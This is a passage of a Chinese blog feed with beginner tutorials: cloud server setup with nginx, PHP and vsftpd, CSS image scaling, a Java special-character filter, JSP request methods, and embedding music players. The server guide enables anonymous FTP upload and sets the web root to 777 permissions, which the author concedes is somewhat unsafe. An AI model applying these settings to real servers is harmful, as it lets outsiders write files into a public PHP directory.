title="在云服务器进行软件安装:"></a>在云服务器进行软件安装:</h3><p>腾讯云服务器提供了yum下载源,即我们可以通过yum在云服务器中下载东西,很简单的命令就可以安装:</p><pre><code># yum install mysql mysql-server nginx php php-fpm</code></pre><p>按<code>y</code>确定后进行安装,出现<code>Complete</code>即安装成功</p><p>安装完软件后,我们可以查看软件相关信息:</p><pre><code># rpm -ql nginx       查看安装目录# rpm -q nginx         查看安装版本</code></pre><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="云服务器环境配置"><a href="#云服务器环境配置" class="headerlink" title="云服务器环境配置:"></a>云服务器环境配置:</h3><p>按照官方文档,我们来配置nginx和php:<br>配置nginx:<br>我们先启动nginx服务先</p><pre><code># service nginx start</code></pre><p>启动完后访问公网IP,如果能访问到,说明nginx服务启动成功</p><p>配置php:<br>同样启动php服务先</p><pre><code># service php-fpm start</code></pre><p>查看php-fpm默认配置</p><pre><code># cat /etc/php-fpm.d/www.conf |grep -i &#39;listen =&#39;</code></pre><p>如果看到<code>listen = 127.0.0.1:9000</code>,说明监听端口为9000,<br>我们要将php解析的请求全部转发到127.0.0.1:9000</p><p>修改nginx配置:</p><pre><code># vim /etc/nginx/conf.d/default.conf</code></pre><p>按官方文档的修改方式来:</p><pre><code>server {      listen       80;      root   /usr/share/nginx/html;      server_name  localhost;  #charset koi8-r;  #access_log  /var/log/nginx/log/host.access.log  main;      location / {          index  index.html index.htm;      }  #error_page  404              /404.html;  # redirect server error pages to the static page /50x.html  #      error_page   500 502 503 504  /50x.html;      location = /50x.html {          root   /usr/share/nginx/html;      }# proxy the PHP scripts to Apache listening on 127.0.0.1:80  ## location ~ \.php$ {  # proxy_pass   http://127.0.0.1;  # }# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000  #      location ~ \.php$ {          fastcgi_pass   127.0.0.1:9000;          fastcgi_index   index.php;          fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;          include        fastcgi_params;      }  # deny access to .htaccess files, if Apache&#39;s document root  # concurs with nginx&#39;s one  #  # location ~ /\.ht {  #    deny  all;  # }}</code></pre><p>修改完后按<code>ESC</code>,然后<code>：wq</code>，保存修改</p><h4 id="注意！要加-不然是无法输的-我早上因为这个弄惨了QAQ"><a href="#注意！要加-不然是无法输的-我早上因为这个弄惨了QAQ" class="headerlink" title="注意！要加:,不然是无法输的,我早上因为这个弄惨了QAQ"></a>注意！要加<code>:</code>,不然是无法输的,我早上因为这个弄惨了QAQ</h4><p>然后重启nginx服务</p><pre><code># service nginx restart</code></pre><p>验证配置:</p><pre><code># vim /usr/share/nginx/html/index.php </code></pre><p>php的内容配置:</p><pre><code>&lt;?php    echo &quot;&lt;title&gt;Test Page&lt;/title&gt;&quot;;    echo &quot;hello world&quot;;?&gt;</code></pre><p>接下来访问公网<code>IP/index.php</code>,看到<code>helloworld</code>就说明环境配置成功了</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="部署代码到云服务器中"><a href="#部署代码到云服务器中" class="headerlink" title="部署代码到云服务器中:"></a>部署代码到云服务器中:</h3><p>一般我们要把代码放到云服务器中,就要通过FTP上传来放,<br>所以我们首先要在云服务器配置FTP服务,在腾讯云上可以直接<br>用yum来装vsftpd配置FTP:</p><pre><code># yum install vsftpd</code></pre><p>然后是配置vsftpd</p><pre><code># vim /etc/vsftpd/vsftpd.conf</code></pre><p>只要将下图的这些选项都搞好就行了,如果你要取消匿名登录使用ftp服务,那么要将<code>vsftpd.conf</code>中的<code>anonymous_enable=YES</code>注释掉或者改为<code>anonymous_enable=NO</code></p><pre><code>local_enable=YESwrite_enable=YESlocal_umask=022anon_upload_enable=YES                //anon的这三个是要你去手动取消注释的,其他的默认都有了anon_mkdir_write_enable=YES            anon_umask=022                        dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=YESpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YES</code></pre><p>你要如何知道这个配置呢?可以通过以下代码进行读取,经过前面的<br>配置我们也能猜到是要用<code>cat</code>这个命令了:</p><pre><code># cat /etc/vsftpd/vsftpd.conf |grep ^[^#]    </code></pre><p>配置了FTP服务后,我们要建立FTP用户名和密码,这是我们要建立FTP连接上传文件要用到的登录用户名和密码,</p><p>建立用户名:</p><pre><code># useradd -d /home/megiki -s /sbin/nologin megiki       megiki是我ftp的用户名,所以将你的用户名替换掉megiki就行了</code></pre><p>给对应用户设置密码:</p><pre><code># passwd megiki     这里同样替换你的ftp用户名</code></pre><h4 id="注意-这里会要你输入密码-并且重新输入-而你的输入是看不到的-所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了-密码不要输错"><a href="#注意-这里会要你输入密码-并且重新输入-而你的输入是看不到的-所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了-密码不要输错" class="headerlink" title="注意!,这里会要你输入密码,并且重新输入,而你的输入是看不到的,所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了,密码不要输错"></a>注意!,这里会要你输入密码,并且重新输入,而你的输入是看不到的,所以你运行了上述命令后直接输入密码按Enter，然后再输入一次密码按Enter就行了,密码不要输错</h4><p>接下来就是修改pam文件了,修改这个文件的目的是为了真正让我们设置的ftp用户能连接到ftp服务器:</p><pre><code># vim /etc/pam.d/vsftpd</code></pre><p>这里按官方文档的修改方式:</p><pre><code>auth required /lib64/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed auth required /lib64/security/pam_unix.so shadow nullok auth required /lib64/security/pam_shells.so account required /lib64/security/pam_unix.so session required /lib64/security/pam_unix.so </code></pre><p>修改完后确认:</p><pre><code># cat /etc/pam.d/vsftpd #%PAM-1.0 </code></pre><p>下面这个是你修改后产生的结果:</p><pre><code>auth required /lib64/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed auth required /lib64/security/pam_unix.so shadow nullok auth required /lib64/security/pam_shells.so account required /lib64/security/pam_unix.so session required /lib64/security/pam_unix.so</code></pre><p>事实上,我在配置的时候发现还是和官方文档的说明有很大差别的,这个是我修改之前的样子:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/修改pam1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E4%BF%AE%E6%94%B9pam1.png" target="_blank" rel="noopener">修改之前</a></a></p><p>这是我修改之后的样子:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/修改pam2.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E4%BF%AE%E6%94%B9pam2.png" target="_blank" rel="noopener">修改之后</a></a></p><p>如果你在按我上面所说的方法配置,遇到了pam文件不一样的问题,也可以按我上面这两个图来配置(注意把里面的ftp用户名改为你的)</p><p>这样云服务器的ftp服务算是完成了,我们可以用FTP上传工具去上传我们的<br>代码了,这里我们用官网说的FileZilla进行FTP上传,我们先建立一个新站点,以后直接连接这个站点就行了~<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/新建ftp连接1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E6%96%B0%E5%BB%BAftp%E8%BF%9E%E6%8E%A51.png" target="_blank" rel="noopener">新建站点</a></a></p><pre><code>主机:你的公网IP端口:用21端口登录类型:一般用户名:填写你设置的FTP用户密码:同上</code></pre><p>然后我们在<code>/usr/share/nginx/html</code>这个目录下进行代码文件的传输,<br>这样就把我们的代码部署到云服务器上了,比如你把<code>text.html</code>传到这个目录下,然后我们访问<code>你的公网IP/text.html</code>,内容就是你上传的<code>text.html</code></p><p><a href="http://7xqtjy.com1.z0.glb.clouddn.com/FTP上传目录1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/FTP%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%951.png" target="_blank" rel="noopener">上传目录</a></a></p><p>这个说一个问题啊,可能我们按上面的步骤进行FTP传输时可能一个都传输不了,这时你可以查看<code>/usr/share/nginx/html</code>这个文件的文件权限,如果是755,说明公共组是不能进行FTP上传的,这时候,我们可以在xshell5上进行权限的修改:</p><pre><code># chmod -R 777 /usr/share/nginx/html</code></pre><p>将权限改为777,然后公共组就拥有了写入的功能,这时可以FTP传输了</p><p>当然,如果你觉得这样不安全(事实上是确实有些不安全的),你可以用git的方式(简单又粗暴),用<code>git clone</code>的方式进行传输,你可以把你上传的代码放在你的<code>github</code>或者<code>coding</code>的私有库上,再传输给你的服务器,具体怎么做这里就不说了(如果你熟悉git操作的话你应该懂的,不懂git为何物的话请戳<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">这里</a>)</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><h3 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h3><p>好了,关于云服务器的配置就说到这里(好像写得有些太长了，其实我个人也不喜欢太长的博客,太长的博客我基本都没有认真看完的QAQ),这个只是新手级别的配置,云服务器是可以让你玩年系列的东西,特别是你在实际项目中的运用,有时间我会继续研究云服务器这个东西的(顺带研究nginx这个东西)</p><p>玩这个东西花了我一早上的时间,早上的汇编和汇编实验课我都在干我自己的<br>(这里说一句,真的,大学那些计算机的课真是纯理论课,没有什么实际意义,老师讲的又慢,硬是能把20分钟的东西用两节课来讲。。。),这段时间我报名了’校园杯’,截止日期是4月23日,也没什么时间给我浪了,所以关于云服务器的探索就到这里,等我搞完这个比赛后再折腾这些(话说校园杯过了后还有CTF,挑战杯QAQ)。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>图片自适应的五种可能</title>
    <link href="undefined2019/11/30/%E5%9B%BE%E7%89%87%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E4%BA%94%E7%A7%8D%E5%8F%AF%E8%83%BD/"/>
    <url>2019/11/30/%E5%9B%BE%E7%89%87%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84%E4%BA%94%E7%A7%8D%E5%8F%AF%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<ol><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#transform实现居中" target="_blank" rel="noopener">transform实现居中</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#background" target="_blank" rel="noopener">background</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#object-fit" target="_blank" rel="noopener">object-fit</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#height使用vw单位" target="_blank" rel="noopener">height使用vw单位</a></li><li><a href="https://vevlins.github.io/2018/03/29/图片自适应的五种可能/#活用padding" target="_blank" rel="noopener">活用padding</a></li></ol><p>在自适应问题上，图片的自适应可以说是最关键了。</p><p>在仿做小红书的过程中，我也遇到了这个问题，小红书作为一个商品展示性的社区，商品图片的自适应是很重要的。在放眼望去都是图片的页面里，一两个变形可能会极大地影响用户的感受。</p><p>我在两个地方遇到了图片适应的问题，一个是品牌精选的卡片，对于宽固定，图片高度不规则并且比容器本身要大的情况；还有一个是在做九宫格要求图片宽高一致。</p><h2 id="transform实现居中"><a href="#transform实现居中" class="headerlink" title="transform实现居中"></a>transform实现居中</h2><p>这是小红书官方采用的方案，设置外层<code>overflow:hidden</code>，然后将内部图片设置居中，多余的部分直接被隐藏。这种方案对于不能明确容器和待展示图片大小关系的情况时并不使用。</p><h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><p>主要应用到的是一个<code>background-size:cover</code>属性，这个属性可以使图片适应填满，多余的部分会被裁剪掉。</p><pre><code>background-image:url();background-size: cover;background-posiiton:center;</code></pre><p>这种方案是目前使用范围最广泛，并且认为最理想的解决方案，但是张鑫旭的博客中对于这种方案提了一点问题：由于cover存在剪裁，所以在大小发生变化时展示出来的背景图区域也是不同的。这主要是因为视窗宽度变化时，高度没有等比例变化。对此他提出了本文最后的两种解决方案。</p><hr><p>一点延伸，在复习background属性时碰到了一个知识点。</p><p>background-clip和background-origin的可选值都是一样的，border-box、padding-box、content-box。那么他们的区别是什么？</p><p>简单来说，clip是规定了定位的区域，而origin只是定义了原点，也就是左上角。</p><p>另外对于border-box，如果填充的是图片，左边和上边实际上并不会填充进去。</p><h2 id="object-fit"><a href="#object-fit" class="headerlink" title="object-fit"></a>object-fit</h2><p><code>object-fit</code>基本上算是<code>background-size</code>的姐妹篇，不同的是，这个属性是对于置换元素而言而非背景图像。</p><h2 id="height使用vw单位"><a href="#height使用vw单位" class="headerlink" title="height使用vw单位"></a>height使用vw单位</h2><p>一言以蔽之：这主要是因为视窗宽度变化时，高度没有等比例变化。</p><h2 id="活用padding"><a href="#活用padding" class="headerlink" title="活用padding"></a>活用padding</h2><p>padding使用百分比单位时，是根据父级元素的宽度来确定的，所以通过设定padding，可以实现自适应，他们的宽高是同时变化的。</p><p>接下来是偷css大招。</p><pre><code>.banner {    padding: 15.15% 0 0;    position: relative;}.banner &gt; img {    position: absolute;    width: 100%; height: 100%;    left: 0; top: 0;}</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java根据正则过滤特殊字符</title>
    <link href="undefined2019/11/26/java%E6%A0%B9%E6%8D%AE%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/"/>
    <url>2019/11/26/java%E6%A0%B9%E6%8D%AE%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<pre><code class="java">public class FilterSpecialStr {    public static void main(String[] args) {        String regEx=&quot;[\n`~!@#$%^&amp;*()+=|{}&#39;:;&#39;,\\[\\].&lt;&gt;/?~！@#￥%……&amp;*（）——+|{}【】‘；：”“’。， 、？]&quot;;           // 除了字母数字下划线之外的字符为非法字符        Pattern pattern = Pattern.compile(regEx);        // 指定设置非法字符        // Pattern pattern = Pattern.compile(&quot;[@#]&quot;);        String str = &quot;123@abc {}  \n  #D     EF。&quot;;        Matcher matcher = pattern.matcher(str);        StringBuffer buffer = new StringBuffer();        //如果找到非法字符        while (matcher.find()) {        // 如果里面包含非法字符如冒号双引号等，那么就把他们消去，并把非法字符前面的字符放到缓冲区            matcher.appendReplacement(buffer, &quot;&quot;);        }        // 将剩余的合法部分添加到缓冲区        matcher.appendTail(buffer);        System.out.println(&quot;过滤前的字符: &quot; + str);        System.out.println(&quot;过滤后的字符: &quot; + buffer.toString());    }}</code></pre><p>输出的结果：</p><p> 过滤前的字符: 123@abc {}<br>  #D   EF。<br> 过滤后的字符: 123abcDEF</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jsp的request对象</title>
    <link href="undefined2019/11/23/jsp%E7%9A%84request%E5%AF%B9%E8%B1%A1/"/>
    <url>2019/11/23/jsp%E7%9A%84request%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="jsp的request对象主要方法"><a href="#jsp的request对象主要方法" class="headerlink" title="jsp的request对象主要方法"></a>jsp的request对象主要方法</h3><h6 id="request对象的方法非常多，只写其中常用的几种方法。"><a href="#request对象的方法非常多，只写其中常用的几种方法。" class="headerlink" title="request对象的方法非常多，只写其中常用的几种方法。"></a>request对象的方法非常多，只写其中常用的几种方法。</h6><ul><li><p><strong>getAttribute(String name);</strong>这个方法可以取出<strong>name</strong>属性的值，<strong>name</strong>属性的值可以用<strong>setAttribute(String name,Object o);</strong>方法赋值，如果没有对其赋值，则默认<strong>name</strong>为<strong>null</strong>;    </p></li><li><p><strong>getContexntPath();</strong>这个方法可以获取服务器上下文的路径；</p></li><li><p><strong>getCookies();</strong>这个方法可以获取客户端的Cookies（一个保存在客户机中的简单的文本文件）；</p></li><li><p><strong>getHeader(String name)</strong>这个方法可以获取指定名称的HTTP报头的属性值；</p></li><li><p><strong>getParameter(String name)</strong>这个方法可以获取客户端提交到服务器的参数；</p></li><li><p><strong>getServerName()</strong>这个方法可以获得服务器的名称</p></li><li><p><strong>getServerPort()</strong>这个方法可以获得服务器的访问端口</p></li><li><p><strong>setAttribute(String name,Object o);</strong>对name属性赋值</p></li><li><p><strong>removeAttribute(String name)</strong>这个方法移除指定名称的属性</p></li><li><p><strong>getRemoteAddr()</strong>这个方法返回客户端的IP地址</p><h2 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h2></li></ul><pre><code class="jsp">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;gb2312&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;request实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    request.setAttribute(&quot;attr&quot;, &quot;hello!&quot;);    out.print(&quot;attr的值&quot;+request.getAttribute(&quot;attr&quot;)+&quot;&lt;br&gt;&quot;);    out.print(&quot;上下文路径&quot;+request.getContextPath()+&quot;&lt;br&gt;&quot;);    out.print(&quot;Cookies:&quot;+request.getCookies()+&quot;&lt;br&gt;&quot;);    out.print(&quot;Host:&quot;+request.getHeader(&quot;Host&quot;)+&quot;&lt;br&gt;&quot;);    out.print(&quot;服务器名称：&quot;+request.getServerName()+&quot;&lt;br&gt;&quot;);    out.print(&quot;服务器端口：&quot;+request.getServerPort()+&quot;&lt;br&gt;&quot;);    out.print(&quot;客户端的IP地址：&quot;+request.getRemoteAddr()+&quot;&lt;br&gt;&quot;);    request.removeAttribute(&quot;attr&quot;);    out.print(&quot;属性移除后的attr的值：&quot;+request.getAttribute(&quot;attr&quot;)+&quot;&lt;br&gt;&quot;);%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><img src="http://a1.qpic.cn/psb?/V13S9xI31Px2LW/p5RYDG8GnkBkSSMOzIUH7uJq0KspJo3TBS*Hf.Iwp9M!/c/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=nwEkAZ8BJAEDGTw!&tl=1&vuin=1458566939&tm=1571918400&sce=60-2-2&rf=0-0" srcset="undefined" style="zoom:150%;" /><ul><li>补充一个<strong>request.setCharacterEncoding(“utf-8”);</strong>用来改变传递参数的编码</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>在博客中添加音乐</title>
    <link href="undefined2019/11/23/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/"/>
    <url>2019/11/23/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<h2 id="1-音乐来源"><a href="#1-音乐来源" class="headerlink" title="1. 音乐来源"></a>1. 音乐来源</h2><p>现在要找个 <code>.mp3</code> 外链资源可真不容易，以往的酷狗歌曲信息里带着，现在也不见了，百度音乐下载也得用客户端，还不显示链接，各大音乐网站真是越来越小心了啊。</p><h3 id="1-1-网易云音乐"><a href="#1-1-网易云音乐" class="headerlink" title="1.1 网易云音乐"></a>1.1 网易云音乐</h3><p>想要从网站获取音乐链接的方法还是有的，比如说 <a href="https://music.163.com/#" target="_blank" rel="noopener">网易云音乐</a> 。使用Google/firefox/edge等带开发者工具的浏览器打开网易云音乐，搜索自己想要的音乐，并进行播放，然后打开开发者工具。开发工具打开方式：</p><ol><li>谷歌：右键点击 <strong>检查</strong>，或使用快捷键 <code>Ctrl+Shift+I</code> ;</li><li>edge：右键点击 <strong>检查元素</strong>/ <strong>查看源</strong>，或使用快捷键 <code>F12</code> ;</li><li>firefox：快捷键 <code>Shift+F2</code> 。</li></ol><p><a href="https://www.litreily.top/assets/music/xishanyao.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/xishanyao.png" srcset="undefined" alt="网易云音乐"></a></p><p>以 <a href="https://music.163.com/#/song?id=405253647" target="_blank" rel="noopener">夕山谣</a> 为例，打开开发工具，找到 <code>Application</code> ，打开 <code>Frames/top/Media</code> 。</p><p><a href="https://www.litreily.top/assets/music/xishanyaoLink.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/xishanyaoLink.png" srcset="undefined" alt="开发工具"></a></p><p>右键选择” Open link in new tab “ 或者 “ Copy link address “，选取链接的前半部分,以 <code>.mp3</code> 结尾。得到链接：</p><pre><code>夕山谣http://m10.music.126.net/20161028204714/808f68e0d3afc7d68d6945d0ce8336eb/ymusic/5a20/163f/3437/9a6871479b12bc82fff53821676faedc.mp3</code></pre><h3 id="1-2-本地上传"><a href="#1-2-本地上传" class="headerlink" title="1.2 本地上传"></a>1.2 本地上传</h3><p>除了上述方法外，也可以手动制作音乐外链，当然，这需要借助于其它网站，比如 <a href="http://www.111ttt.com/up/" target="_blank" rel="noopener">www.111ttt.com/up/</a> 。在该网站上传已经下好的音乐文件，然后点击播放地址，在弹出的页面底部就有已生成的外链地址了。</p><p><a href="https://www.litreily.top/assets/music/upFile.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/upFile.png" srcset="undefined" alt="上传音乐"></a></p><pre><code>Critty 杏花弦外雨http://sc.111ttt.com/up/mp3/193721/278DF18856D56FEC6B4E6EDC15D97906.mp3</code></pre><h3 id="1-3-七牛云存储"><a href="#1-3-七牛云存储" class="headerlink" title="1.3 七牛云存储"></a>1.3 七牛云存储</h3><p><a href="http://www.qiniu.com/" target="_blank" rel="noopener">七牛云</a> 作为国内领先的企业级云服务商，当然提供了最基本的云存储服务。当前可以免费注册并进行实名认证，之后可以获取 10GB 的免费存储空间。</p><p><a href="https://www.litreily.top/assets/music/qiniuyunSpace.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/qiniuyunSpace.png" srcset="undefined" alt="七牛云免费空间"></a></p><p>注册并登录后，需要先创建一个空间，如 <code>litreily</code>，然后打开 <code>对象存储</code> &gt;&gt; <code>litreily</code> &gt;&gt; <code>内容管理</code>。此时便可上传文件，文件类型不限，我们可以将本地音乐文件上传后获取其外链地址。</p><p><a href="https://www.litreily.top/assets/music/qiniuyunLink.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/qiniuyunLink.png" srcset="undefined" alt="七牛云外链获取方法"></a></p><p>所得外链地址为：</p><pre><code>CRITTY - 轮回之境http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3</code></pre><h2 id="2-音乐播放器"><a href="#2-音乐播放器" class="headerlink" title="2. 音乐播放器"></a>2. 音乐播放器</h2><h3 id="2-1-网易云音乐插件"><a href="#2-1-网易云音乐插件" class="headerlink" title="2.1 网易云音乐插件"></a>2.1 网易云音乐插件</h3><p>网易云音乐提供了外链播放器，官方提供的使用方法如下：</p><ol><li>在 <a href="https://music.163.com/" target="_blank" rel="noopener">music.163.com</a> 进入单曲、歌单、专辑、电台节目页面后，点击 “生成外链播放器” 链接。</li><li>歌单和专辑外链播放器可以选择大中小三种尺寸，单曲和电台节目可以选择中小两种尺寸。你可以选择最适合你网站设计的尺寸。</li><li>还可以选择是否要自动播放，打上勾后，别人访问网站时播放器会自动开始播放。</li><li>最后将播放器的代码黏贴到你的网站上，大功告成！</li></ol><p>[示例：杏花轩外雨]</p><p><a href="https://www.litreily.top/assets/music/wlPlayer.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/wlPlayer.png" srcset="undefined" alt="网易云音乐外链播放器"></a></p><p>[示例代码]</p><p><a href="https://www.litreily.top/assets/music/wlDemo.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/wlDemo.png" srcset="undefined" alt="网易云音乐外链demo"></a></p><p>[示例说明]</p><ol><li>HTML源码中的 “ auto=1 “ 代表自动播放，改为0即可取消自动播放功能；</li><li>在markdown文件中引用该插件时，需要将 <code>iframe</code> 的 <code>width</code> 和 <code>height</code> 属性值用双引号包围起来，即 width=”330” height=”86” ,否则可能出现无法解析该代码的情况；</li><li>使用插件时可以添加一个类（如：class=”musicPlayer”），参考以下代码可以设置播放器的长宽。</li></ol><pre><code>.musicPlayer{    width: 100%;    max-width: 500px;}</code></pre><p>[示例播放1：height=66 auto=1]</p><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=1&amp;height=66"></iframe><pre><code>&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot;height=&quot;86&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;</code></pre><p>[示例播放2：height=32 auto=0]</p><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32"></iframe><pre><code>&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot;height=&quot;52&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32&quot;&gt;&lt;/iframe&gt;</code></pre><h3 id="2-2-audio-js"><a href="#2-2-audio-js" class="headerlink" title="2.2 audio.js"></a>2.2 audio.js</h3><p><a href="https://kolber.github.io/audiojs/" target="_blank" rel="noopener">audio.js</a>是一款轻量级的音乐播放器，下载文件后，将文件夹 “audiojs” 放在网站文件目录中，通过以下代码的形式将该播放器引入网页中。</p><pre><code>&lt;head&gt;    ...    &lt;script src=&quot;/audiojs/audio.min.js&quot;&gt;&lt;/script&gt;    &lt;script&gt;      audiojs.events.ready(function() {        audiojs.createAll();      });    &lt;/script&gt;    ...&lt;/head&gt;&lt;body&gt;    ...    &lt;!-- 音乐播放器位置 --&gt;    &lt;!-- preload=&quot;auto&quot; 可以替换为 autoplay 或者 loop  --&gt;    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot;    preload=&quot;auto&quot;&gt;&lt;/audio&gt;    &lt;!-- 说明：使用该插件后，其脚本语言将自动为其添加以下内容：        class=&quot;audiojs&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;        如果一个页面中存在多个audiojs播放器，其id尾数将从0逐一增加        通过css修改这些属性，我们可以改变播放器的外观 --&gt;    ...&lt;/body&gt;</code></pre><p>[示例：杏花轩外雨，链接由上述1.2方式而得]</p><p>[示例html源码]</p><pre><code>&lt;div class=&quot;audiojs   playing&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;&gt;    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot; preload=&quot;auto&quot;&gt;&lt;/audio&gt;    &lt;div class=&quot;play-pause&quot;&gt;                     &lt;p class=&quot;play&quot;&gt;&lt;/p&gt;                     &lt;p class=&quot;pause&quot;&gt;&lt;/p&gt;                     &lt;p class=&quot;loading&quot;&gt;&lt;/p&gt;                     &lt;p class=&quot;error&quot;&gt;&lt;/p&gt;               &lt;/div&gt;               &lt;div class=&quot;scrubber&quot;&gt;        &lt;div class=&quot;progress&quot; style=&quot;width: 167.146px;&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;loaded&quot; style=&quot;width: 280px;&quot;&gt;&lt;/div&gt;    &lt;/div&gt;               &lt;div class=&quot;time&quot;&gt;        &lt;em class=&quot;played&quot;&gt;02:22&lt;/em&gt;/&lt;strong class=&quot;duration&quot;&gt;03:57&lt;/strong&gt;               &lt;/div&gt;      &lt;div class=&quot;error-message&quot;&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="2-3-其它"><a href="#2-3-其它" class="headerlink" title="2.3 其它"></a>2.3 其它</h3><ul><li><a href="http://www.ithome.com/html/it/195970.htm" target="_blank" rel="noopener">7 款高颜值 HTML5 播放器</a></li><li><a href="https://www.oschina.net/news/27466/html5-audio-players" target="_blank" rel="noopener">10 个基于 Web 的 HTML5 音乐播放器</a></li><li><a href="http://www.shejidaren.com/free-audio-players.html" target="_blank" rel="noopener">10 个免费开源的 JS 音乐播放器插件</a></li><li><a href="http://www.17sucai.com/pins/tag/3189.html" target="_blank" rel="noopener">播放器 jquery 特效代码</a></li></ul><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>网易云音乐的播放器插件使用方便，但是连接效率太低，经常获取不到资源或者获取速度过慢，而 audiojs 播放器虽然外观简陋些，但资源下载效率还不错，而且资源地址可以自定义，不会受限。所以，各有利弊，依情况而定吧。</p><blockquote><p>本文作者：cuicuihao</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java_Oop知识点总结</title>
    <link href="undefined2019/10/12/Java-Oop%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <url>2019/10/12/Java-Oop%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    
